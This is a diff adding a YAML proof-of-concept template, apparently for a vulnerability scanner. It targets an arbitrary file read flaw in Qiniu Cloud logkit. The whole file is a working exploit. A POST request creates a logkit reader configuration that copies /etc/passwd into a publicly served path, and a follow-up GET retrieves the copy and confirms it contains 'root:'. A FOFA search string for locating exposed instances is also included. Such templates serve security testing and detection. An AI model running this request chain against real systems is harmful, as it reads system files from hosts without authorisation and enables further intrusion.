@@ -1,0 +1,67 @@
+id: poc-yaml-qiniu-logkit-log-path-anyfile-read
+info:
+  name: 七牛云 logkit log_path 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 七牛云
+  fofa: title="七牛Logkit配置文件助手"
+requests:
+- method: POST
+  path: /logkit/configs/passwdread
+  headers:
+    Content-Type: application/json
+  data: '{
+
+    "name": "passwdread",
+
+    "batch_interval": 1,
+
+    "collect_interval": 1,
+
+    "reader": {
+
+    "mode": "file",
+
+    "log_path": "/etc/passwd",
+
+    "read_from": "oldest",
+
+    "datasource_tag": "datasource",
+
+    "encoding": "UTF-8"
+
+    },
+
+    "parser": {
+
+    "type": "raw",
+
+    "name": "parser",
+
+    "timestamp": "true"
+
+    },
+
+    "transforms": [],
+
+    "senders": [
+
+    {
+
+    "sender_type": "file",
+
+    "file_send_path": "/app/public/passwd.log"
+
+    }
+
+    ]
+
+    }'
+  expression: status_code == 200 && contains(body,`{"code":"L200"}`) && contains(content_type,"application/json")
+- method: GET
+  path: /passwd.log
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
